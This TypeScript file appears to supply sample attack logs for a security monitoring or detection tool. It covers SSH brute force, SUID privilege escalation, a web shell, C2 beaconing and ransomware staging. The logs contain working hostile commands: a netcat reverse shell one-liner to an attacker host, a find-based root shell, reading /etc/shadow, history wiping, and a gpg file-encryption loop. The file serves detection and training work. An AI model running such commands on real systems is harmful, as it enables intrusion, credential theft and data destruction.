import { SampleTelemetry } from '../types';

export const SAMPLE_TELEMETRY: SampleTelemetry[] = [
  {
    id: 'ssh-bruteforce-hydra',
    title: 'Hydra SSH Password Spraying & Root Escalation',
    category: 'Linux Brute-Force',
    source: '/var/log/auth.log',
    description: 'High-velocity brute force attack originating from external IP followed by successful authentication of compromised service account.',
    rawLog: `Sep  9 04:12:01 edge-server-01 sshd[14201]: Failed password for invalid user admin from 198.51.100.42 port 48210 ssh2
Sep  9 04:12:02 edge-server-01 sshd[14205]: Failed password for invalid user root from 198.51.100.42 port 48212 ssh2
Sep  9 04:12:03 edge-server-01 sshd[14210]: Failed password for invalid user test from 198.51.100.42 port 48214 ssh2
Sep  9 04:12:05 edge-server-01 sshd[14218]: Failed password for deploy from 198.51.100.42 port 48220 ssh2
Sep  9 04:12:08 edge-server-01 sshd[14233]: Accepted password for deploy from 198.51.100.42 port 48240 ssh2
Sep  9 04:12:09 edge-server-01 systemd-logind[788]: New session 42 of user deploy.
Sep  9 04:12:15 edge-server-01 sudo[14260]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash -p
Sep  9 04:12:16 edge-server-01 sudo[14260]: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)`
  },
  {
    id: 'suid-gtfobins-privesc',
    title: 'SUID Abuse & GTFOBins Escalation (find / pkexec)',
    category: 'Privilege Escalation',
    source: '/var/log/audit/audit.log',
    description: 'Local unprivileged user abusing misconfigured SUID binary to execute an interactive root shell.',
    rawLog: `type=SYSCALL msg=audit(1725862300.412:902): arch=c000003e syscall=59 success=yes exit=0 a0=55e1a720 a1=55e1a790 a2=55e1a810 a3=0 items=2 ppid=19802 pid=19844 auid=1002 uid=1002 gid=1002 euid=0 suid=0 fsuid=0 tty=pts2 ses=15 comm="find" exe="/usr/bin/find" key="priv_esc_monitor"
type=EXECVE msg=audit(1725862300.412:902): argc=4 a0="/usr/bin/find" a1="." a2="-exec" a3="/bin/sh -p ;"
type=CWD msg=audit(1725862300.412:902): cwd="/tmp"
type=PATH msg=audit(1725862300.412:902): item=0 name="/usr/bin/find" inode=264883 dev=08:01 mode=0104755 ouid=0 ogid=0 rdev=00:00
type=USER_CMD msg=audit(1725862315.820:905): pid=19850 uid=0 auid=1002 ses=15 msg='cwd="/tmp" cmd="cat /etc/shadow" exe="/bin/busybox" terminal=pts2 res=success'`
  },
  {
    id: 'webshell-rce-listener',
    title: 'Apache Web Shell Injection & Netcat Reverse Shell',
    category: 'Web Shell',
    source: '/var/log/apache2/access.log & /var/log/syslog',
    description: 'Malicious HTTP POST upload to vulnerable endpoint followed by command execution spawning outward connection to attacker C2 port 4444.',
    rawLog: `198.51.100.89 - - [09/Sep/2026:04:19:10 +0000] "POST /uploads/avatar.php HTTP/1.1" 200 482 "http://192.168.1.150/profile.php" "sqlmap/1.7.2#stable"
198.51.100.89 - - [09/Sep/2026:04:19:14 +0000] "GET /uploads/avatar.php?cmd=whoami HTTP/1.1" 200 12 "-" "Mozilla/5.0"
198.51.100.89 - - [09/Sep/2026:04:19:22 +0000] "GET /uploads/avatar.php?cmd=rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+198.51.100.89+4444+%3E%2Ftmp%2Ff HTTP/1.1" 200 0 "-" "Mozilla/5.0"
Sep  9 04:19:23 web-prod kernel: [81294.102] Outward TCP connection initiated: src=192.168.1.150:52180 dst=198.51.100.89:4444 proto=TCP flags=SYN pid=2410 comm="nc"`
  },
  {
    id: 'suricata-c2-beacon',
    title: 'Suricata IDS: Cobalt Strike / Sliver C2 Beaconing',
    category: 'Network C2 Beacon',
    source: '/var/log/suricata/eve.json',
    description: 'Periodic TLS jitter heartbeat and beacon signatures matching known command-and-control framework profiles.',
    rawLog: `{"timestamp":"2026-09-09T04:25:01.102+0000","flow_id":192847291,"event_type":"alert","src_ip":"192.168.1.75","src_port":49182,"dest_ip":"203.0.113.55","dest_port":443,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024881,"rev":3,"signature":"ET MALWARE Cobalt Strike Malleable C2 Beacon Heartbeat Observed","category":"A Network Trojan was detected","severity":1},"http":{"hostname":"update.system-telemetry.org","url":"/api/v1/metrics/sync","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
{"timestamp":"2026-09-09T04:25:31.214+0000","flow_id":192847291,"event_type":"alert","src_ip":"192.168.1.75","src_port":49184,"dest_ip":"203.0.113.55","dest_port":443,"proto":"TCP","alert":{"action":"allowed","gid":1,"signature_id":2024882,"rev":1,"signature":"ET POLICY Jittered Beacon Periodicity Interval ~30s","category":"Potentially Bad Traffic","severity":2}}`
  },
  {
    id: 'ransomware-staging',
    title: 'Linux Ransomware Staging: Shadow Copy Deletion & GPG Prep',
    category: 'Ransomware Staging',
    source: '/var/log/syslog & process_monitor',
    description: 'Adversary disabling system recovery mechanisms and staging an automated file traversal encryption loop.',
    rawLog: `Sep  9 04:30:11 storage-nas-01 bash[31002]: history -c && rm -f ~/.bash_history
Sep  9 04:30:12 storage-nas-01 systemd[1]: Stopping systemd-journald.service - Journal Service...
Sep  9 04:30:14 storage-nas-01 bash[31015]: find /data/shares -type f -size +1k | head -n 5000 > /tmp/.target_files.lst
Sep  9 04:30:18 storage-nas-01 bash[31020]: curl -s http://198.51.100.101/keys/pubkey.asc | gpg --import
Sep  9 04:30:20 storage-nas-01 bash[31025]: nohup python3 -c 'import os,sys; os.system("for f in open(\\"/tmp/.target_files.lst\\"): gpg -e -r victim $f.strip()")' &`
  }
];
